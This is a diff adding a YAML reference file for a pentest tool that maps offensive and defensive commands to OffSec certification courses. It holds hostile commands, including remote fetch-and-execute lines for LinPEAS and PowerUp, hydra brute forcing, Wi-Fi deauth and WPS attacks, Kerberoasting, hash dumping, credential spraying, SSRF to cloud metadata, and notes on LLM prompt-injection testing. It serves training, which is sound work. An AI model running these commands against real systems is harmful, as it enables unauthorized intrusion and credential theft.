@@ -1,0 +1,268 @@
+# RaspyJack-X — ACADEMY
+# A command + technique reference mapped to the OffSec certification paths.
+# AUTHORIZED, EDUCATIONAL USE ONLY. These are the standard, publicly documented
+# commands you learn in each course; run them only against systems you own or
+# are contracted to test. Placeholders <ip> <url> <domain> <subnet> <iface>
+# <mon> <bssid> <hash> <file> are filled from your VARS when you tap "Run".
+#
+# This file is pure data — add your own certs/modules/notes freely.
+
+certs:
+  - code: KLCP
+    exam: PEN-103
+    name: Kali Linux Certified Professional
+    modules:
+      - topic: System & packages
+        items:
+          - cmd: "sudo apt update && sudo apt full-upgrade -y"
+            note: "Keep Kali current; rolling release."
+          - cmd: "apt search <term>; apt show <pkg>"
+            note: "Find and inspect tools before installing."
+          - cmd: "sudo systemctl status ssh; sudo systemctl enable --now ssh"
+            note: "Manage services; many tools run as daemons."
+          - cmd: "kali-tweaks"
+            note: "Official menu for hardening, metapackages, shell config."
+      - topic: Shell fundamentals
+        items:
+          - cmd: "grep -rinE '([0-9]{1,3}\\.){3}[0-9]{1,3}' ."
+            note: "Recursively pull IPs from loot; regex is a daily tool."
+          - cmd: "find / -perm -4000 -type f 2>/dev/null"
+            note: "SUID hunt — the first Linux privesc reflex."
+          - cmd: "tmux new -s op"
+            note: "Persistent sessions so long scans survive a dropped link."
+
+  - code: OSCP
+    exam: PEN-200
+    name: Penetration Testing with Kali
+    modules:
+      - topic: Enumeration
+        items:
+          - cmd: "nmap -p- --min-rate 2000 -oN all.txt <ip>"
+            note: "All 65535 TCP ports fast, then re-scan the open ones deeply."
+          - cmd: "nmap -p<ports> -sV -sC -oN deep.txt <ip>"
+            note: "Version + default scripts on discovered ports."
+          - cmd: "sudo nmap -sU --top-ports 100 -oN udp.txt <ip>"
+            note: "Don't forget UDP — SNMP/TFTP/DNS live here."
+          - cmd: "feroxbuster -u <url> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"
+            note: "Recursive content discovery on web services."
+      - topic: Service attacks
+        items:
+          - cmd: "enum4linux-ng <ip>"
+            note: "SMB/RPC enumeration — shares, users, policy."
+          - cmd: "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<ip> -t4 -f"
+            note: "Credential attack once you have a userlist."
+          - cmd: "searchsploit <product version>"
+            note: "Map a version to a public exploit before touching Metasploit."
+      - topic: Linux priv-esc
+        items:
+          - cmd: "wget <lhost>/linpeas.sh -O /tmp/lp.sh; bash /tmp/lp.sh"
+            note: "LinPEAS surfaces SUID, cron, caps, creds, kernel."
+          - cmd: "sudo -l"
+            note: "Mis-set sudo rules are the most common path (see GTFOBins)."
+          - cmd: "getcap -r / 2>/dev/null"
+            note: "Capabilities like cap_setuid give instant root."
+      - topic: Windows priv-esc
+        items:
+          - cmd: "whoami /priv"
+            note: "SeImpersonate → Potato attacks; the classic win."
+          - cmd: "winPEAS.exe"
+            note: "Enumerates services, unquoted paths, AlwaysInstallElevated."
+          - cmd: "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/PowerUp.ps1')"
+            note: "PowerUp checks service/registry priv-esc vectors."
+
+  - code: OSWP
+    exam: PEN-210
+    name: Wireless Professional
+    modules:
+      - topic: Monitor & capture
+        items:
+          - cmd: "sudo airmon-ng start <iface>"
+            note: "Put the adapter into monitor mode (or use rjx-mon)."
+          - cmd: "sudo airodump-ng <mon>"
+            note: "Survey APs/clients; note BSSID, channel, encryption."
+          - cmd: "sudo airodump-ng -c <ch> --bssid <bssid> -w cap <mon>"
+            note: "Lock onto one AP to capture the 4-way handshake."
+      - topic: WPA / WPS
+        items:
+          - cmd: "sudo aireplay-ng --deauth 5 -a <bssid> <mon>"
+            note: "Nudge a client to re-auth so you catch the handshake."
+          - cmd: "sudo hcxdumptool -i <mon> -w pmkid.pcapng"
+            note: "Clientless PMKID capture — no deauth needed."
+          - cmd: "hcxpcapngtool -o wifi.22000 pmkid.pcapng"
+            note: "Convert to hashcat mode 22000."
+          - cmd: "hashcat -m 22000 wifi.22000 /usr/share/wordlists/rockyou.txt"
+            note: "Crack the PSK offline."
+          - cmd: "sudo reaver -i <mon> -b <bssid> -vv"
+            note: "WPS PIN attack where WPS is enabled/weak."
+
+  - code: OSEP
+    exam: PEN-300
+    name: Experienced Penetration Tester (Evasion & AD)
+    modules:
+      - topic: Active Directory
+        items:
+          - cmd: "kerbrute userenum -d <domain> --dc <ip> users.txt"
+            note: "Pre-auth user enumeration via Kerberos."
+          - cmd: "impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <ip>"
+            note: "AS-REP roasting of accounts without pre-auth."
+          - cmd: "impacket-GetUserSPNs <domain>/<user> -request -dc-ip <ip>"
+            note: "Kerberoasting service accounts for offline cracking."
+          - cmd: "bloodhound-python -d <domain> -c all -ns <ip> -u <user>"
+            note: "Map attack paths to Domain Admin."
+      - topic: Lateral movement
+        items:
+          - cmd: "netexec smb <subnet> -u <user> -p <pass> --continue-on-success"
+            note: "Spray creds; find where they're local admin."
+          - cmd: "impacket-psexec <domain>/<user>@<ip>"
+            note: "Exec as SYSTEM over SMB once you have admin."
+          - cmd: "impacket-secretsdump <domain>/<user>@<ip>"
+            note: "Dump SAM/LSA/NTDS hashes; feed pass-the-hash."
+      - topic: Evasion concepts
+        items:
+          - cmd: "# AMSI/ETW bypass + unhooking — study the WHY"
+            note: "OSEP teaches how EDR sees you; tune tradecraft, not copy-paste."
+
+  - code: OSWA
+    exam: WEB-200
+    name: Web Assessor
+    modules:
+      - topic: Mapping
+        items:
+          - cmd: "whatweb <url>; wafw00f <url>"
+            note: "Fingerprint stack and any WAF first."
+          - cmd: "ffuf -u <url>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt"
+            note: "Content discovery; add -recursion for depth."
+      - topic: OWASP Top 10
+        items:
+          - cmd: "sqlmap -u '<url>?id=1' --batch --dbs"
+            note: "Confirm and enumerate SQLi databases."
+          - cmd: "dalfox url <url>"
+            note: "Automated reflected/stored/DOM XSS discovery."
+          - cmd: "# SSRF: force the app to request http://169.254.169.254/"
+            note: "Cloud metadata is the classic SSRF target."
+          - cmd: "# IDOR: increment IDs / swap GUIDs in requests"
+            note: "Broken access control is the #1 OWASP risk."
+
+  - code: OSWE
+    exam: WEB-300
+    name: Advanced Web Expert (White-box)
+    modules:
+      - topic: Source review
+        items:
+          - cmd: "semgrep --config auto ."
+            note: "Static analysis to find sinks fast in a codebase."
+          - cmd: "grep -rinE 'eval|exec|deserialize|pickle|unserialize' ."
+            note: "Hunt dangerous sinks for RCE chains."
+      - topic: Chaining to RCE
+        items:
+          - cmd: "# Auth bypass -> account takeover -> deserialization -> RCE"
+            note: "OSWE is about chaining low-sev bugs into code exec."
+          - cmd: "# SSTI: {{7*7}} / ${7*7} to detect template engine"
+            note: "Template injection often yields RCE."
+
+  - code: OSED
+    exam: EXP-301
+    name: Windows Exploit Development
+    modules:
+      - topic: Debugging
+        items:
+          - cmd: "# x64dbg / WinDbg: attach, set breakpoints, inspect stack"
+            note: "Live debugging is the core skill."
+          - cmd: "!mona config -set workingfolder c:\\mona\\%p"
+            note: "Mona.py in Immunity/WinDbg drives the whole workflow."
+          - cmd: "!mona pattern_create 2000 ; !mona findmsp"
+            note: "Find the offset to EIP/SEH with a cyclic pattern."
+      - topic: Bypassing mitigations
+        items:
+          - cmd: "!mona rop -m <dll> -cpb '\\x00\\x0a\\x0d'"
+            note: "Build a ROP chain to defeat DEP."
+          - cmd: "# egghunter for small buffers; SEH overwrite for structured handlers"
+            note: "Match the technique to the space you control."
+
+  - code: OSEE
+    exam: EXP-401
+    name: Advanced Exploitation Expert
+    modules:
+      - topic: Advanced techniques
+        items:
+          - cmd: "# Custom ROP, ASLR defeat via info-leak, heap grooming"
+            note: "OSEE is research-grade; concepts over canned payloads."
+          - cmd: "# Kernel: driver IOCTL fuzzing, token stealing shellcode"
+            note: "Windows kernel exploitation primitives."
+
+  - code: OSDA
+    exam: SOC-200
+    name: Defense Analyst (Blue)
+    modules:
+      - topic: Windows telemetry
+        items:
+          - cmd: "# Event ID 4624/4625 — logon success/failure"
+            note: "Baseline auth; spot spraying and lateral movement."
+          - cmd: "# Event ID 4688 + Sysmon 1 — process creation"
+            note: "Catch LOLBins (rundll32, mshta, regsvr32)."
+          - cmd: "Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625}"
+            note: "Pull failed logons with PowerShell."
+      - topic: SIEM hunting
+        items:
+          - cmd: "index=win EventCode=4688 | stats count by Image"
+            note: "Splunk: rare parent/child chains stand out."
+          - cmd: "# ELK/KQL: DeviceProcessEvents | where FileName in~ ('mshta.exe')"
+            note: "Hunt suspicious binaries across the fleet."
+
+  - code: OSTH
+    exam: TH-200
+    name: Threat Hunter
+    modules:
+      - topic: Hypothesis-driven hunting
+        items:
+          - cmd: "# Map to MITRE ATT&CK technique, then hunt its telemetry"
+            note: "Start from a TTP (e.g. T1055 injection), not an alert."
+          - cmd: "# Sigma rule -> convert to your SIEM query (sigmac)"
+            note: "Portable detections across backends."
+          - cmd: "sigmac -t splunk rule.yml"
+            note: "Compile a Sigma rule to Splunk SPL."
+
+  - code: OSIR
+    exam: IR-200
+    name: Incident Responder
+    modules:
+      - topic: Triage & memory
+        items:
+          - cmd: "vol -f mem.raw windows.pslist"
+            note: "Volatility 3: list processes from a memory image."
+          - cmd: "vol -f mem.raw windows.malfind"
+            note: "Find injected/hidden code regions."
+          - cmd: "# Acquire: avml (Linux) / winpmem (Windows) before power-off"
+            note: "Capture volatile memory first — it's gone on reboot."
+      - topic: Timeline & containment
+        items:
+          - cmd: "log2timeline.py plaso.dump <image>; psort.py -o l2tcsv plaso.dump"
+            note: "Build a super-timeline of the compromise."
+          - cmd: "# Isolate host, preserve evidence, rotate creds"
+            note: "Contain without tipping off the adversary."
+
+  - code: OSCC-SEC
+    exam: SEC-100
+    name: CyberCore — Security Essentials
+    modules:
+      - topic: Foundations
+        items:
+          - cmd: "ip a; ip route; ss -tulpn"
+            note: "Know the host's network posture cold."
+          - cmd: "openssl s_client -connect <domain>:443 | openssl x509 -noout -text"
+            note: "Read a certificate; understand TLS basics."
+          - cmd: "# CIA triad, least privilege, defense in depth"
+            note: "The vocabulary every role shares."
+
+  - code: OSAI
+    exam: AI-300
+    name: AI Red Teamer
+    modules:
+      - topic: LLM attack surface
+        items:
+          - cmd: "garak --model_type openai --probes promptinject"
+            note: "Automated LLM vulnerability scanner."
+          - cmd: "# Prompt injection: direct + indirect (poisoned content/tools)"
+            note: "The top LLM risk — untrusted text becomes instructions."
+          - cmd: "# Test: jailbreaks, data exfil via tools, insecure output handling"
+            note: "Map to the OWASP LLM Top 10."
